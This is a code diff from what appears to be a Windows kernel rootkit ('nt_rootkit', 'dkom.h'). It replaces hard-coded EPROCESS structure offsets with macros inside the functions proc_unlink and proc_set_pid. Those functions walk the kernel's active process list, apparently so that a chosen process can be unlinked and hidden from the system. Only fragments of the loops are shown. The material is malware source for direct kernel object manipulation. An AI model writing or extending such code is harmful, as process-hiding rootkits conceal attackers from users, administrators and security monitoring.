@@ -1,9 +1,5 @@
 #include "dkom.h"
 
-DWORD32 UniqueProcessId = 0x440;
-DWORD32 ActiveProcessLinks = 0x448;
-DWORD32 Token = 0x4b8;
-
 NTSTATUS proc_unlink(UINT32 pid) {
         if (!pid)
         {
@@ -14,7 +10,7 @@ NTSTATUS proc_unlink(UINT32 pid) {
         PEPROCESS curr_proc = PsGetCurrentProcess();
 
         PLIST_ENTRY curr_entry = (PLIST_ENTRY)((PUCHAR)curr_proc +
-                ActiveProcessLinks);
+                PROC_LINKS_OFFSET);
         PLIST_ENTRY curr_flink = NULL;
         PLIST_ENTRY curr_blink = curr_entry->Blink;
 
@@ -22,7 +18,7 @@ NTSTATUS proc_unlink(UINT32 pid) {
         {
                 curr_flink = curr_entry->Flink;
                 PUINT32 curr_pid = (PUINT32)(((ULONG_PTR)curr_entry -
-                        ActiveProcessLinks) + UniqueProcessId);
+                        PROC_LINKS_OFFSET) + PID_OFFSET);
 
                 //DbgPrint("nt_rootkit: target: %d", pid);
                 //DbgPrint("nt_rootkit: curr_pid: %d", *curr_pid);
@@ -52,7 +48,7 @@ NTSTATUS proc_set_pid(UINT32 pid) {
         PEPROCESS curr_proc = PsGetCurrentProcess();
 
         PLIST_ENTRY curr_entry = (PLIST_ENTRY)((PUCHAR)curr_proc +
-                ActiveProcessLinks);
+                PROC_LINKS_OFFSET);
         PLIST_ENTRY curr_flink = NULL;
         PLIST_ENTRY curr_blink = curr_entry->Blink;
 
@@ -60,7 +56,7 @@ NTSTATUS proc_set_pid(UINT32 pid) {
         {
                 curr_flink = curr_entry->Flink;
                 PUINT32 curr_pid = (PUINT32)(((ULONG_PTR)curr_entry -
-                        ActiveProcessLinks) + UniqueProcessId);
+                        PROC_LINKS_OFFSET) + PID_OFFSET);
 
                 //DbgPrint("nt_rootkit: target: %d", pid);
                 //DbgPrint("nt_rootkit: curr_pid: %d", *curr_pid);
